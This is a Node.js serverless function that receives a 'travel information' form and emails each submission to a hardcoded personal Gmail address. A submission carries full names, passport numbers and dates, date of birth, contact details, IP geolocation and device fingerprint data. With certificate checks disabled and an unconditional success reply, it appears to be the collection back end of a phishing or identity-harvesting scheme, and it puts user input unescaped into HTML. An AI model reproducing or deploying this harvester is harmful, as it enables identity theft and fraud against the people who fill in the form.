const nodemailer = require('nodemailer');

module.exports = async (req, res) => {
    // Only allow POST requests
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    console.log('Received data:');
    console.log(JSON.stringify(req.body, null, 2));

    const { formData, ipInfo, deviceDetails } = req.body;

    const transporter = nodemailer.createTransport({
        host: process.env.EMAIL_HOST || 'mail.getdaabo.com.ng',
        port: parseInt(process.env.EMAIL_PORT) || 465,
        secure: true,
        auth: {
            user: process.env.EMAIL_USER,
            pass: process.env.EMAIL_PASS,
        },
        logger: true,
        debug: true,
        connectionTimeout: 10000,
        greetingTimeout: 5000,
        socketTimeout: 10000,
        tls: {
            rejectUnauthorized: false,
        },
    });

    const mailOptions = {
        from: `"Form Submission" <${process.env.EMAIL_USER}>`,
        to: process.env.RECIPIENT_EMAIL || 'david.igiebor@gmail.com',
        subject: 'New Travel Information Form Submission',
        html: `
            <h1>New Form Submission</h1>
            <h2>User Information</h2>
            <ul>
                <li><strong>First Name:</strong> ${formData.firstName}</li>
                <li><strong>Middle Name:</strong> ${formData.middleName}</li>
                <li><strong>Last Name:</strong> ${formData.lastName}</li>
                <li><strong>Passport No:</strong> ${formData.passportNo}</li>
                <li><strong>Passport Production Date:</strong> ${formData.passportProdDate}</li>
                <li><strong>Passport Expiry Date:</strong> ${formData.passportExpDate}</li>
                <li><strong>Marital Status:</strong> ${formData.maritalStatus}</li>
                <li><strong>Date of Birth:</strong> ${formData.dob}</li>
                <li><strong>Phone Number:</strong> ${formData.phoneNumber}</li>
                <li><strong>Email:</strong> ${formData.email}</li>
                <li><strong>Address:</strong> ${formData.address}</li>
            </ul>
            <h2>IP and Geolocation Information</h2>
            <ul>
                <li><strong>IP Address:</strong> ${ipInfo.ip}</li>
                <li><strong>City:</strong> ${ipInfo.city}</li>
                <li><strong>Region:</strong> ${ipInfo.region}</li>
                <li><strong>Country:</strong> ${ipInfo.country_name}</li>
                <li><strong>Location:</strong> ${ipInfo.latitude}, ${ipInfo.longitude}</li>
                <li><strong>ISP:</strong> ${ipInfo.org}</li>
            </ul>
            <h2>Device Details</h2>
            <ul>
                <li><strong>Browser:</strong> ${deviceDetails.browser.name} ${deviceDetails.browser.version}</li>
                <li><strong>OS:</strong> ${deviceDetails.os.name} ${deviceDetails.os.version}</li>
                <li><strong>Device:</strong> ${deviceDetails.device.vendor} ${deviceDetails.device.model} (${deviceDetails.device.type})</li>
            </ul>
        `,
    };

    // Log the submission server-side and immediately acknowledge receipt to the client.
    console.log('Submission logged. Responding to client BEFORE attempting to send email.');
    res.status(200).json({ message: 'Data received. Thank you!' });

    // Send email in the background so client always receives a success response.
    (async () => {
        try {
            await transporter.verify();
        } catch (verifyErr) {
            console.error('Background SMTP verify failed:', verifyErr);
            return;
        }

        try {
            await transporter.sendMail(mailOptions);
            console.log('Background email sent successfully');
        } catch (error) {
            console.error('Background error sending email:', error);
        }
    })();
};
